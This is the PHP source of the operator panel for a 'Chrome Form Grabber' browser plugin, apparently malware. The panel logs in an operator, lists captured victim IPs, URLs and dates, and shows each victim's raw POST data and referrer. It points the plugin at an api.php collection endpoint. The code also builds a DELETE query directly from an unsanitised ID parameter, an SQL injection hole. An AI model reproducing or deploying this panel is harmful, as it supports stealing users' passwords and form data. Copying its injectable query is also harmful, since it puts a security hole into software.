<?php
error_reporting(0);
$BASEPATH = str_replace("index.php", "", realpath(__FILE__));
define("BASEPATH", $BASEPATH);
//  echo BASEPATH;
$configFile = BASEPATH . "config.php";
if (file_exists($configFile)) {
    require_once('config.php');
} else {
    $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER["REQUEST_URI"];
    $url = str_replace("index.php", "", $url);
    $url = $url . "install.php";
//    echo $url;
//      header("Location: "+$url);
    die("<html>"
            . "<head>"
            . "<meta http-equiv=\"refresh\" content=\"0;URL='" . $url . "'\" /> "
            . "</head>"
            . "</html>");
//      exit();
//      die();
}



require_once('inc/functions.php');
session_set_cookie_params(0, "/");
session_start();




mysql_c($settings['mysql']['server'], $settings['mysql']['username'], $settings['mysql']['password'], $settings['mysql']['database']);


if ((!isset($_SESSION['login'])) && $_SESSION['login'] != crypt_ip($_SERVER['REMOTE_ADDR']) . 'login' && $_GET['p'] != 'login') {
    Header('Location: index.php?p=login');
}
$page['cont'] = "";
switch (isset($_GET['p']) ? $_GET['p'] : 'default') {

    case 'install':
        $page['cont'] .= '
                <div class="register span5">
                    <form action="" method="post">
                        <h2>Install<span class="red"><strong> It!</strong></span></h2>
                        <label for="username">Database</label>
                        <input type="text" id="username" name="username" placeholder="Write your username...">
                        <label for="password">Database Username</label>
                        <input type="password" id="password" name="password" placeholder="Write your password...">
                        <button type="submit">Install it!</button>
                    </form>
                </div>';
        break;
    case 'login':
        $page['cont'] = "";
        switch ($_SERVER['REQUEST_METHOD']) {
            case 'POST':
                if (isset($_POST['username']) && isset($_POST['password']) && $_POST['username'] == $settings['login']['username'] && $_POST['password'] == $settings['login']['password']) {
                    $_SESSION['login'] = crypt_ip($_SERVER['REMOTE_ADDR']) . 'login';
                    $page['cont'] .= '<meta http-equiv="refresh" content="0;url=index.php"></a>';
                } else {
                    $page['cont'] .= '
                <div class="register span5">
                    <form action="" method="post">
                        <h2>LOG <span class="red"><strong>IN</strong></span></h2>
                        <label><span style="color:blue"><strong>Incorrect username or password</strong></span></label>
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" placeholder="Write your username...">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" placeholder="Write your password...">
                        <button type="submit">Log in</button>
                    </form>
                </div>    ';
                    break;
                }
            default:
                $page['cont'] .= '
                <div class="register span5">
                    <form action="" method="post">
                        <h2>LOG <span class="red"><strong>IN</strong></span></h2>
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" placeholder="Write your username...">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" placeholder="Write your password...">
                        <button type="submit">Log in</button>
                    </form>
                </div>';
        }
        break;
    case 'logout':
        session_destroy();
        $page['cont'] .= '<meta http-equiv="refresh" content="0;url=index.php?p=login"></a>';
        break;
    case 'del':
        if (isset($_GET['ID'])) {
            mysql_q("DELETE FROM users WHERE ID = '" . $_GET['ID'] . "';");
            $ta = array();
            $ta['url'] = 'aasd';
            echo json_encode($ta);
            die();
//            Header('Location:' . $_SERVER ['HTTP_REFERER'] . '');
        }
        break;

    default:

        $total = mysql_result(mysql_q('SELECT COUNT(*) AS cnt FROM users'), 0);
        $page['cont'] = "";
        $url = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER["REQUEST_URI"];
        $url = str_replace("index.php", "", $url);
        $url = $url . "api.php";

        $page['cont'] .= '
                    <div class="register span12">
                    <form action="" method="post">
 <h2><span class="red">Users: ' . $total . '<span> - Powered by <a href="https://jsocket.org">JSocket</a></h2>';
        $installFile = BASEPATH . "install.php";
        $alert_msg = "";
        if (file_exists($installFile)) {
            $page['cont'] .=' <h3>Delete install.php</h3>';
        }

        $page['cont'] .='<h4>URL Plugin: ' . $url . '</h4>
                        <div id="jqxgrid"></div>
                        </div>';
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <title>Chrome Form Grabber</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="description" content="Panel for the plugin Chrome FormGrabber">
        <meta name="author" content="JSocket">
        <script src="assets/js/jquery-1.8.2.min.js"></script>
        <link rel="stylesheet" type="text/css" href="assets/css/dd.css" />
        <script src="assets/js/jquery.dd.js"></script>
        <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>



        <!-- CSS -->
        <link rel='stylesheet' href='http://fonts.googleapis.com/css?family=PT+Sans:400,700'>
        <link rel='stylesheet' href='http://fonts.googleapis.com/css?family=Oleo+Script:400,700'>
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
        <!--[if lt IE 9]>
            <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
        <![endif]-->


        <link rel="stylesheet" href="assets/js/jqwidgets/styles/jqx.base.css" type="text/css" />
        <link rel="stylesheet" href="assets/js/jqwidgets/styles/jqx.classic.css" type="text/css" />
        <!--<script type="text/javascript" src="assets/js/scripts/jquery-1.10.2.min.js"></script>-->  
        <script type="text/javascript" src="assets/js/jqwidgets/jqxcore.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxbuttons.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxscrollbar.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxlistbox.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxdropdownlist.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxmenu.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxdata.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxgrid.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxgrid.sort.js"></script>	
        <script type="text/javascript" src="assets/js/jqwidgets/jqxgrid.selection.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxgrid.pager.js"></script>
        <script type="text/javascript" src="assets/js/jqwidgets/jqxtabs.js"></script>
        <script src="assets/js/scripts.js"></script>
        <style type="text/css">


            .textarea-label
            {
                display: block;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box;
                /* border, padding, and other styles go here,
                don't set the height, and don't use floats or positioning */
            }

            .textarea-label textarea
            {
                border: 0 none;
                margin: 0;
                outline: 0 none;
                padding: 0;
                width: 100%;
                height: 100%;
            }
        </style>

        <script type="text/javascript">
            $(document).ready(function () {
                // prepare the data
                var source =
                        {
                            datatype: "json",
                            datafields: [
                                {name: 'ID', type: 'string'},
                                {name: 'IP', type: 'string'},
                                {name: 'URL', type: 'string'},
                                {name: 'DATE', type: 'string'}
                            ],
                            id: 'ID',
                            url: 'data.php',
                            root: 'Rows',
                            cache: false,
                            beforeprocessing: function (data) {
                                source.totalrecords = data[0].TotalRows;
                            },
                            sort: function ()
                            {
                                $("#jqxgrid").jqxGrid('updatebounddata', 'sort');
                            }
                        };



                var initrowdetails = function (index, parentElement, gridElement) {
                    var row = index;
                    var id = $("#jqxgrid").jqxGrid('getrowdata', row)['ID'];
                    var grid = $($(parentElement).children()[0]);

                    var tabsdiv = null;
                    var information = null;
                    var notes = null;
                    // update the details height.
                    //rowinfo.detailsHeight = 200;

                    var data = {
                        "ID": id
                    };
                    data = $(this).serialize() + "&" + $.param(data);
                    $.ajax({
                        type: "POST",
                        dataType: "json",
                        url: "data.php", //Relative or absolute path to response.php file
                        data: data,
                        success: function (datas) {
     //             alert("Form submitted successfully.\nReturned json: " + datas[0]["COOKIE"]);
     //                    tabsdiv = $(element.children()[0]);
                            grid.append($("<div style='margin: 10px;'><ul style='margin-left: 30px;'><li>Data POST</li><li>URL REF</li></ul><div class='notes'></div><div class='information'></div></div>"));
                            tabsdiv = $(grid.children()[0]);
                            if (tabsdiv != null) {
                                information = tabsdiv.find('.information');
                                notes = tabsdiv.find('.notes');
          
                                

                                var container = $('<div style="white-space: normal; margin: 5px;"><label class="textarea-label">' + '<textarea rows="20">' + datas[0]["URL_REF"] + '</textarea></label></div>');
                               

                                var notescontainer = $('<div style="white-space: normal; margin: 5px;"><label class="textarea-label">' + '<textarea rows="20">' + datas[0]["RAW"] + '</textarea></label></div>');
                                $(notes).append(notescontainer);
                                $(information).append(container);
                                $(tabsdiv).jqxTabs({width: 820, height: 170});
                            }
     //        alert("Form submit json: " + datas[0]["COOKIE"]);
                        }
                    });

                };

                var dataAdapter = new $.jqx.dataAdapter(source);


                // set rows details.
                $("#jqxgrid").bind('bindingcomplete', function (event) {
                    if (event.target.id == "jqxgrid") {
                        $("#jqxgrid").jqxGrid('beginupdate');
                        var datainformation = $("#jqxgrid").jqxGrid('getdatainformation');
                        for (i = 0; i < datainformation.rowscount; i++) {
                            $("#jqxgrid").jqxGrid('setrowdetails', i, "<div id='grid" + i + "' style='margin: 10px;'></div>", 220, true);
                        }
                        $("#jqxgrid").jqxGrid('resumeupdate');
                    }
                });

                $("#jqxgrid").jqxGrid(
                        {
                            width: 1024,
                            pageSize: 50,
                            source: dataAdapter,
                            theme: 'classic',
                            pageable: true,
                            sortable: true,
                            autoheight: true,
                            virtualmode: true,
                            rowdetails: true,
                            initrowdetails: initrowdetails,
                            rendergridrows: function () {
                                return dataAdapter.records;
                            },
                            columns: [
                                {text: 'ID', datafield: 'ID', width: 80},
                                {text: 'IP', datafield: 'IP', width: 180},
                                {text: 'URL', datafield: 'URL', width: 434},
                                {text: 'DATE', datafield: 'DATE', width: 200},
                                {text: 'DELETE', datafield: 'DELETE', width: 90, columntype: 'button', cellsrenderer: function () {
                                        return "DELETE";
                                    }, buttonclick: function (row) {
                                        // open the popup window when the user clicks a button.
                                        editrow = row;
                                        //var offset = $("#jqxgrid").offset();
                                        //$("#popupWindow").jqxWindow({ position: { x: parseInt(offset.left) + 60, y: parseInt(offset.top) + 60 } });

                                        // get the clicked row's data and initialize the input fields.
                                        var dataRecord = $("#jqxgrid").jqxGrid('getrowdata', editrow);
     //                     $("#firstName").val(dataRecord.FirstName);
     //                     $("#lastName").val(dataRecord.LastName);
     //                     $("#title").val(dataRecord.Title);
     //                  
     //                     // show the popup window.
     //                     $("#popupWindow").jqxWindow('open');

                                        var data = {
                                            "ID": dataRecord.ID,
                                            "p": "del"
                                        };
                                        data = $(this).serialize() + "&" + $.param(data);
                                        $.ajax({
     //      type: "POST",
                                            dataType: "json",
                                            url: "index.php", //Relative or absolute path to response.php file
                                            data: data,
                                            success: function (datas) {
                                                location.reload(true);
                                            }
                                        });
                                    }
                                }
                            ]
                        });
            });
        </script>
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="row">
                    <div class="logo span4">
                        <h1><a href="index.php">Chrome Form Grabber<span class="red">.</span></a></h1>
                    </div>
                    <div class="links span8">
                        <a class="home" href="index.php" rel="tooltip" data-placement="bottom" data-original-title="Users"></a>

                        <a class="info" href="https://jsocket.org" rel="tooltip" data-placement="bottom" data-original-title="JSocket"></a>
                        <a class="exit" href="index.php?p=logout" rel="tooltip" data-placement="bottom" data-original-title="Exit"></a>
                    </div>
                </div>
            </div>
        </div>
        <div class="register-container container">
            <div class="row">
<?php echo $page['cont']; ?>
            </div>

        </div>
    </div>

</body>
</html>